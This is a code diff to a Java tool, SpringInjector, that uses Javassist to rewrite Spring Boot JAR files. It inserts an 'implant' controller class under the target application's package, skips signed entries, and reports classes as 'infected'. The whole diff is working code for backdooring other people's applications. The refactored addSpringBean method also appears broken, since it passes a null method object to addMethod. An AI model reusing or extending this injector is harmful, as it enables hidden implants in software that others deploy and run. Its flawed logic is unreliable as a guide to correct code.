@@ -1,7 +1,9 @@
 package org.example.injector;
 
-import javassist.CtClass;
-import javassist.bytecode.*;
+import javassist.bytecode.AnnotationsAttribute;
+import javassist.bytecode.ClassFile;
+import javassist.bytecode.DuplicateMemberException;
+import javassist.bytecode.MethodInfo;
 import javassist.bytecode.annotation.Annotation;
 import org.example.implants.SpringImplantController;
 
@@ -67,7 +69,6 @@ public class SpringInjector {
                     continue;
                 }
                 if (entry.getCodeSigners() != null) {
-                    //System.out.println("[-] File '" + entry.getName() + "' is signed. Not touching this!");
                     foundSignedClasses = true;
                     passEntry(targetJar, jarOutputStream, entry);
                     continue;
@@ -86,13 +87,6 @@ public class SpringInjector {
                         // TODO Explicitly add a @Bean to the configuration
                         // Maybe it doesn't hurt to add it despite @ContentScan being enabled?
 
-//                        didInfect = infectClass(classFile);
-//                        if (didInfect) {
-//                            newEntry(classFile, jarOutputStream, entry);
-//                        } else {
-//                            passEntry(targetJar, jarOutputStream, entry);
-//                        }
-
                         System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan). Infection not (yet) supported!");
                         continue;
                     } else {
@@ -100,10 +94,11 @@ public class SpringInjector {
                     }
 
                     // Just add a new class into the JAR
-                    String targetPackageName = getPackageNameFromClassFile(classFile);
+                    String targetPackageName = parsePackageNameFromFqcn(classFile.getName());
                     System.out.println("[+] Found package name: " + targetPackageName);
                     ClassFile implantClass = loadImplantClass();
-                    implantClass.setName(targetPackageName + ".SpringImplantController");   // TODO Don't hardcode this
+                    String implantClassName = parseClassNameFromFqcn(implantClass.getName());
+                    implantClass.setName(targetPackageName + "." + implantClassName);
                     String fullPathInsideJar = "BOOT-INF/classes/" + implantClass.getName().replace(".", "/") + ".class";
                     JarEntry newJarEntry = new JarEntry(fullPathInsideJar);
                     newEntry(implantClass, jarOutputStream, newJarEntry);
@@ -121,15 +116,21 @@ public class SpringInjector {
         return didInfect;
     }
 
-    private String getPackageNameFromClassFile(final ClassFile classFile) {
-        String fqcn = classFile.getName();
+    private static String parsePackageNameFromFqcn(final String fqcn) {
         String[] parts = fqcn.split("\\.");
         if (parts.length < 2) {
             throw new RuntimeException("Not a fully qualified class name: " + fqcn);
         }
         String[] packageParts = Arrays.copyOfRange(parts, 0, parts.length - 1);
-        String packageName = String.join(".", packageParts);
-        return packageName;
+        return String.join(".", packageParts);
+    }
+
+    private static String parseClassNameFromFqcn(final String fqcn) {
+        String[] parts = fqcn.split("\\.");
+        if (parts.length < 2) {
+            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
+        }
+        return parts[parts.length - 1];
     }
 
     private ClassFile loadImplantClass() throws IOException {
@@ -140,20 +141,17 @@ public class SpringInjector {
         }
     }
 
-    private boolean infectClass(ClassFile classFile) {
-        MethodInfo dummyImplant = classFile.getMethod("dummyImplant");
+    private boolean addSpringBean(ClassFile springConfigClass, final ClassFile implantClass) {
+        MethodInfo dummyImplant = springConfigClass.getMethod("getImplantController");    // TODO Don't hardcode this
         if (dummyImplant != null) {
-            System.out.println("[-] Class '" + classFile.getName() + "' already infected. Skipping.");
+            System.out.println("[-] Class '" + springConfigClass.getName() + "' already infected. Skipping.");
             return false;
         }
 
-        dummyImplant = new MethodInfo(classFile.getConstPool(), "dummyImplant", "()V");
-        Bytecode dummyCode = new Bytecode(classFile.getConstPool(), 0, 0);
-        dummyCode.addReturn(CtClass.voidType);
-        dummyImplant.setCodeAttribute(dummyCode.toCodeAttribute());
+        // TODO Just copy over a pre-compiled method
 
         try {
-            classFile.addMethod(dummyImplant);
+            springConfigClass.addMethod(dummyImplant);
         } catch (DuplicateMemberException e) {
             System.out.println("[!] Unexpected error: " + e.getMessage());
             return false;
